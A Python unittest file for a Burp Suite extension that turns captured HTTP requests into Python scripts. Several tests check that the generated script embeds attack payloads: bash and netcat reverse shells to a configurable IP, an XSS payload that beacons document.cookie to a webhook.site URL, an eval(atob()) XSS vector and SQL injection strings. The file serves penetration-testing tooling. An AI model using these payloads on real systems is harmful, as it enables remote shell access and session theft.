import unittest
import sys
import os
from types import ModuleType

# Mock Java modules
class MockPrintWriter:
    def __init__(self, stream, autoflush=True): pass
    def println(self, msg): pass

java_io = ModuleType('java.io')
java_io.PrintWriter = MockPrintWriter
java_util = ModuleType('java.util')
java_util.ArrayList = list
java_awt = ModuleType('java.awt')
java_awt.Toolkit = type('Toolkit', (), {'getDefaultToolkit': lambda: type('obj', (), {'getSystemClipboard': lambda: None, 'getSystemSelection': lambda: None})()})
java_awt_datatransfer = ModuleType('java.awt.datatransfer')
java_awt_datatransfer.StringSelection = type('StringSelection', (), {})
javax_swing = ModuleType('javax.swing')
javax_swing.JMenuItem = type('JMenuItem', (), {})
javax_swing.JOptionPane = type('JOptionPane', (), {})

sys.modules['java.io'] = java_io
sys.modules['java.util'] = java_util
sys.modules['java.awt'] = java_awt
sys.modules['java.awt.datatransfer'] = java_awt_datatransfer
sys.modules['javax.swing'] = javax_swing
sys.modules['java'] = ModuleType('java')
burp = ModuleType('burp')
burp.IBurpExtender = type('IBurpExtender', (), {})
burp.IContextMenuFactory = type('IContextMenuFactory', (), {})
burp.IHttpRequestResponse = type('IHttpRequestResponse', (), {})
sys.modules['burp'] = burp

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from adapters.python_parser import PythonParser

class MockRequestTree:
    def __init__(self, method="GET", headers=None, cookies=None, auth=None, url_data=None, body_type=None, body_data=None, files=None):
        self.general = type('obj', (object,), {
            'method': method,
            'headers': headers or {},
            'cookies': cookies,
            'Authorization': auth,
            'url': type('obj', (object,), url_data or {
                'parameters': {},
                'path': '/test',
                'protocol': 'https',
                'domain': 'example.com',
                'port': 443
            })()
        })()
        
        self.application_json = body_data if body_type == 'json' else None
        self.application_x_www_form_urlencoded = body_data if body_type == 'form' else None
        self.multipart_form_data = body_data if body_type == 'multipart' else None
        self.files = files

class MockCallbacks:
    def getStdout(self): return None
    def getStderr(self): return None

# Mock clipboard
clipboard_data = None
def mock_copy_clipboard(self, data):
    global clipboard_data
    clipboard_data = data

PythonParser.copy_clipboard = mock_copy_clipboard

class TestPythonParser(unittest.TestCase):
    def setUp(self):
        self.callbacks = MockCallbacks()
        global clipboard_data
        clipboard_data = None

    def test_get_request_generation(self):
        tree = MockRequestTree(
            method="GET",
            headers={"User-Agent": "Test"},
            cookies={"session": "abc123"}
        )
        
        PythonParser([tree], self.callbacks, None, True)
        
        self.assertIsNotNone(clipboard_data)
        self.assertIn("def request_1(", clipboard_data)
        self.assertIn("construct_url", clipboard_data)
        self.assertIn("requests.request(", clipboard_data)

    def test_post_json_generation(self):
        tree = MockRequestTree(
            method="POST",
            headers={"Content-Type": "application/json"},
            auth="Bearer token123",
            body_type="json",
            body_data={"username": "test"}
        )
        
        PythonParser([tree], self.callbacks, None, True)
        
        self.assertIn("json=body", clipboard_data)
        self.assertIn("Authorization", clipboard_data)

    def test_post_form_generation(self):
        tree = MockRequestTree(
            method="POST",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            body_type="form",
            body_data={"key1": "value1"}
        )
        
        PythonParser([tree], self.callbacks, None, True)
        
        self.assertIn("construct_x_www_form_urlencoded", clipboard_data)
        self.assertIn("data=stringified_body", clipboard_data)

    def test_multipart_generation(self):
        tree = MockRequestTree(
            method="POST",
            headers={"Content-Type": "multipart/form-data"},
            body_type="multipart",
            body_data={"field1": "value1"},
            files=[{"for": "file", "filename": "test.txt", "contentType": "text/plain", "data": "dGVzdA=="}]
        )
        
        PythonParser([tree], self.callbacks, None, True)
        
        self.assertIn("files_data", clipboard_data)
        self.assertIn("base64.b64decode", clipboard_data)

    def test_imports_present(self):
        tree = MockRequestTree(method="GET")
        
        PythonParser([tree], self.callbacks, None, True)
        
        self.assertIn("import requests", clipboard_data)
        self.assertIn("import urllib.parse", clipboard_data)

    def test_utility_functions_present(self):
        tree = MockRequestTree(method="GET")
        
        PythonParser([tree], self.callbacks, None, True)
        
        self.assertIn("def construct_url", clipboard_data)
        self.assertIn("def construct_cookies", clipboard_data)
        self.assertIn("def construct_x_www_form_urlencoded", clipboard_data)

    def test_main_function_generated(self):
        tree = MockRequestTree(method="GET")
        
        PythonParser([tree], self.callbacks, None, True)
        
        self.assertIn("def main():", clipboard_data)
        self.assertIn('if __name__ == "__main__":', clipboard_data)

    def test_configurable_reverse_shell_ip(self):
        """Test that REVERSE_SHELL_IP configuration variable is present"""
        tree = MockRequestTree(method="GET")
        
        PythonParser([tree], self.callbacks, None, True)
        
        self.assertIn('REVERSE_SHELL_IP = "127.0.0.1"', clipboard_data)

    def test_configurable_reverse_shell_port(self):
        """Test that REVERSE_SHELL_PORT configuration variable is present"""
        tree = MockRequestTree(method="GET")
        
        PythonParser([tree], self.callbacks, None, True)
        
        self.assertIn('REVERSE_SHELL_PORT = 1337', clipboard_data)

    def test_configurable_webhook_url(self):
        """Test that WEBHOOK_URL configuration variable is present"""
        tree = MockRequestTree(method="GET")
        
        PythonParser([tree], self.callbacks, None, True)
        
        self.assertIn('WEBHOOK_URL = "https://webhook.site/your-unique-id"', clipboard_data)

    def test_xss_payload_variable(self):
        """Test that XSS_PAYLOAD configuration variable is present with webhook beacon"""
        tree = MockRequestTree(method="GET")
        
        PythonParser([tree], self.callbacks, None, True)
        
        self.assertIn('XSS_PAYLOAD = """const a = async () => {', clipboard_data)
        self.assertIn('navigator.sendBeacon(\\"{WEBHOOK_URL}\\", document.cookie);', clipboard_data)

    def test_sqli_payloads_array(self):
        """Test that SQLi payloads array is present"""
        tree = MockRequestTree(method="GET")
        
        PythonParser([tree], self.callbacks, None, True)
        
        self.assertIn('sqli_payloads = [', clipboard_data)
        self.assertIn("\"' OR '1'='1\"", clipboard_data)
        self.assertIn("\"admin' --\"", clipboard_data)
        self.assertIn("\"' UNION SELECT NULL--\"", clipboard_data)

    def test_xss_payloads_array(self):
        """Test that XSS payloads array is present with base64 encoded payload"""
        tree = MockRequestTree(method="GET")
        
        PythonParser([tree], self.callbacks, None, True)
        
        self.assertIn('xss_payloads = [', clipboard_data)
        self.assertIn('eval(atob(', clipboard_data)
        self.assertIn('base64.b64encode', clipboard_data)
        self.assertIn('<img src=x onerror=alert(1)>', clipboard_data)

    def test_reverse_shell_payloads_array(self):
        """Test that reverse shell payloads array uses configurable variables"""
        tree = MockRequestTree(method="GET")
        
        PythonParser([tree], self.callbacks, None, True)
        
        self.assertIn('reverse_shell_payloads = [', clipboard_data)
        self.assertIn('f"bash -i >& /dev/tcp/{REVERSE_SHELL_IP}/{REVERSE_SHELL_PORT} 0>&1"', clipboard_data)
        self.assertIn('f"nc -e /bin/sh {REVERSE_SHELL_IP} {REVERSE_SHELL_PORT}"', clipboard_data)

    def test_reverse_shell_payloads_use_variables(self):
        """Test that all reverse shell payloads use the configuration variables"""
        tree = MockRequestTree(method="GET")
        
        PythonParser([tree], self.callbacks, None, True)
        
        # Check that hardcoded IPs are not present in reverse shell payloads
        self.assertNotIn('10.0.0.1', clipboard_data)
        self.assertNotIn('4242', clipboard_data)
        # Verify variables are used
        self.assertIn('{REVERSE_SHELL_IP}', clipboard_data)
        self.assertIn('{REVERSE_SHELL_PORT}', clipboard_data)

    def test_payload_selection_comments(self):
        """Test that commented payload selection is present in main()"""
        tree = MockRequestTree(method="GET")
        
        PythonParser([tree], self.callbacks, None, True)
        
        self.assertIn('# payloads = sqli_payloads', clipboard_data)
        self.assertIn('# payloads = xss_payloads', clipboard_data)
        self.assertIn('# payloads = reverse_shell_payloads', clipboard_data)

    def test_execute_parallel_requests_function(self):
        """Test that execute_parallel_requests function is present for load testing"""
        tree = MockRequestTree(method="GET")
        
        PythonParser([tree], self.callbacks, None, True)
        
        self.assertIn('def execute_parallel_requests(request_func, payloads, max_workers=10):', clipboard_data)
        self.assertIn('ThreadPoolExecutor', clipboard_data)
        self.assertIn('as_completed', clipboard_data)

    def test_configuration_variables_order(self):
        """Test that configuration variables are at the top in correct order"""
        tree = MockRequestTree(method="GET")
        
        PythonParser([tree], self.callbacks, None, True)
        
        # Find positions of key elements
        reverse_shell_ip_pos = clipboard_data.find('REVERSE_SHELL_IP')
        reverse_shell_port_pos = clipboard_data.find('REVERSE_SHELL_PORT')
        webhook_url_pos = clipboard_data.find('WEBHOOK_URL')
        xss_payload_pos = clipboard_data.find('XSS_PAYLOAD')
        construct_url_pos = clipboard_data.find('def construct_url')
        
        # Configuration should come before functions
        self.assertLess(reverse_shell_ip_pos, construct_url_pos)
        self.assertLess(reverse_shell_port_pos, construct_url_pos)
        self.assertLess(webhook_url_pos, construct_url_pos)
        self.assertLess(xss_payload_pos, construct_url_pos)
        
        # Check relative order of config variables
        self.assertLess(reverse_shell_ip_pos, reverse_shell_port_pos)
        self.assertLess(reverse_shell_port_pos, webhook_url_pos)

    def test_request_function_parameters(self):
        """Test that request function has all required parameters"""
        tree = MockRequestTree(method="GET")
        
        PythonParser([tree], self.callbacks, None, True)
        
        self.assertIn('timeout=30', clipboard_data)
        self.assertIn('verify_ssl=True', clipboard_data)
        self.assertIn('proxies=None', clipboard_data)

    def test_url_dictionary_structure(self):
        """Test that URLs are dictionaries not objects"""
        tree = MockRequestTree(method="GET")
        
        PythonParser([tree], self.callbacks, None, True)
        
        self.assertIn('"domain":', clipboard_data)
        self.assertIn('"protocol":', clipboard_data)
        self.assertIn('"port":', clipboard_data)
        self.assertIn('"path":', clipboard_data)
        self.assertIn('"parameters":', clipboard_data)
        # Ensure no UrlObject class
        self.assertNotIn('class UrlObject', clipboard_data)

if __name__ == '__main__':
    unittest.main()
